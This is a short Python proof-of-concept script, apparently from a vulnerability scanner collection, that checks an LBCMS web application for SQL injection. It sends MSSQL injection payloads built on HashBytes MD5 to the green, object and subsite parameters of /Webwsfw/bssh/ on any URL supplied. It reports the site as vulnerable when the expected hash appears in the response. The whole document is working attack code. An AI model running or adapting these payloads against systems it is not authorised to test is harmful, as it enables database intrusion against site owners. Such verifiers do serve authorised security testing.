#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: LBCMS多处SQL注入漏洞
referer: http://www.wooyun.org/bugs/wooyun-2010-0122653
author: Lucifer
description: 1、/Webwsfw/bssh/?green=1
             2、/Webwsfw/bssh/?object=11
             3、/Webwsfw/bssh/?subsite=1 都存在注入。
'''
import sys
import requests



class lbcms_webwsfw_bssh_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payloads = ["/Webwsfw/bssh/?green=1%20AnD%20SyS.Fn_VarBintoHexstr(HashBytes(%27MD5%27,%271234%27))>0--",
                    "/Webwsfw/bssh/?object=11%20AnD%20SyS.Fn_VarBintoHexstr(HashBytes(%27MD5%27,%271234%27))>0--",
                    "/Webwsfw/bssh/?subsite=1%20AnD%20SyS.Fn_VarBintoHexstr(HashBytes(%27MD5%27,%271234%27))>0--"]
        try:
            for payload in payloads:
                vulnurl = self.url + payload
                req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                    return "[+]存在LBCMS多处SQL注入漏洞...(高危)\tpayload: "+vulnurl

        except:
            return "[-]connect timeout"

if __name__ == "__main__":

    testVuln = lbcms_webwsfw_bssh_sqli_BaseVerify(sys.argv[1])
    testVuln.run()